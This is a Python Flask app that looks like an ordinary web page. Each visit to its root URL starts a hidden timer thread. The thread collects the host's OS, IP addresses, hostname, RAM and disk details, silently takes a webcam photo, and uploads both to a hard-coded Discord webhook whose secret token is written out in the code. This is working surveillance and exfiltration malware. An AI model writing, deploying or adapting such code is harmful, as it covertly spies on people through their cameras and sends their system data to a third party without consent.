from flask import Flask, render_template
import os
import platform
import socket
import requests
import tempfile
import psutil
from datetime import datetime
import pytz
import cv2
import threading  # Import the threading module

app = Flask(__name__)
def get_os_info():
    """
    Get information about the operating system.
    """
    os_info = f"OS: {platform.system()} {platform.version()} ({platform.architecture()[0]})"
    return os_info

def get_ip_address():
    """
    Get the local IP address and router's IP address.
    """
    try:
        # Get local IP address
        ip_address = socket.gethostbyname(socket.gethostname())

        # Get router's IP address
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(('8.8.8.8', 1))  # Connect to a known external server
            router_ip_address = s.getsockname()[0]

        return f"IP Address: {ip_address}\nRouter IP Address: {router_ip_address}"
    except Exception as e:
        return f"Error getting IP addresses: {str(e)}"

def get_system_info():
    """
    Get information about the computer's system.
    """
    try:
        # Get computer name
        computer_name = socket.gethostname()

        # Get RAM information
        ram_info = f"RAM: {psutil.virtual_memory().total / (1024 ** 3):.2f} GB"

        # Get storage information
        disk_info = psutil.disk_usage('/')
        storage_info = f"Storage: {disk_info.total / (1024 ** 3):.2f} GB\nFree Space: {disk_info.free / (1024 ** 3):.2f} GB"

        return f"Computer Name: {computer_name}\n{ram_info}\n{storage_info}"
    except Exception as e:
        return f"Error getting system information: {str(e)}"

def get_time_info():
    """
    Get current time and time zone information.
    """
    try:
        # Get current time in Eastern Time (ET) zone
        eastern_timezone = pytz.timezone('US/Eastern')
        eastern_time = datetime.now(eastern_timezone)

        return f"Current Eastern Time: {eastern_time.strftime('%Y-%m-%d %H:%M:%S %Z')}"
    except Exception as e:
        return f"Error getting time information: {str(e)}"

def capture_and_send_image(webhook_url, file_name):
    """
    Capture an image using the built-in camera and send it to Discord.
    """
    try:
        # Capture an image using the built-in camera
        cap = cv2.VideoCapture(0)
        
        # Check if the camera is opened successfully
        if not cap.isOpened():
            print("Error: Could not open the camera.")
            return

        # Capture a frame
        ret, frame = cap.read()

        # Check if the frame is captured successfully
        if not ret or frame is None:
            print("Error: Could not capture a frame.")
            cap.release()
            return

        cap.release()

        # Save the captured image temporarily
        image_path = os.path.join(tempfile.gettempdir(), file_name + ".png")
        cv2.imwrite(image_path, frame)

        # Send the image to Discord
        with open(image_path, 'rb') as image_file:
            payload = {'content': 'Image captured with system information and time details'}
            files = {'file': (file_name + ".png", image_file)}
            response = requests.post(webhook_url, data=payload, files=files)

        if response.status_code == 204:
            print('Image sent successfully!')
        else:
            print(f'Failed to send image. Status code: {response.status_code}')
            print(response.text)

        # Clean up: Delete the temporary image file
        os.remove(image_path)
    except Exception as e:
        print(f'Error capturing and sending image: {str(e)}')

def create_and_send_file(webhook_url, file_name, content):
    """
    Create a text file with the given content and send it to Discord.
    """
    try:
        # Create a temporary file
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as temp_file:
            temp_file.write(content)
            temp_file_path = temp_file.name

        # Send the file to Discord
        with open(temp_file_path, 'rb') as file:
            payload = {'content': 'File with system information and time details'}
            files = {'file': (file_name + ".txt", file)}
            response = requests.post(webhook_url, data=payload, files=files)

        if response.status_code == 204:
            print('File sent successfully!')
        else:
            print(f'Failed to send file. Status code: {response.status_code}')
            print(response.text)

        # Clean up: Delete the temporary file
        os.remove(temp_file_path)
    except Exception as e:
        print(f'Error creating and sending file: {str(e)}')


## UPDATER

def auto_submit_data():
    # Replace 'your_webhook_url_here' with the actual webhook URL for your Discord channel
    webhook_url = 'https://discord.com/api/webhooks/1186450053083172896/OSF2w5rn8G28vqwQC8O5Y3Bpmkp-bLgxdbEFlt8QRqwTgOTqjrIMe7uJ_mU06QV4g7XI'
    file_name_to_send = 'discord'

    # Get OS info, local IP address, router's IP address, system information, and time details
    os_info = get_os_info()
    ip_addresses = get_ip_address()
    system_info = get_system_info()
    time_info = get_time_info()

    # Combine all information
    content_to_write = f"{os_info}\n{ip_addresses}\n{system_info}\n{time_info}"

    # Create and send the text file
    create_and_send_file(webhook_url, file_name_to_send, content_to_write)

    # Capture and send the image
    capture_and_send_image(webhook_url, file_name_to_send)

def start_auto_submit_thread():
    # Start a thread to auto-submit data after a delay
    threading.Timer(10, auto_submit_data).start()  # 10 seconds delay

@app.route('/')
def index():
    # Start the auto-submit thread when the user accesses the root URL
    start_auto_submit_thread()
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
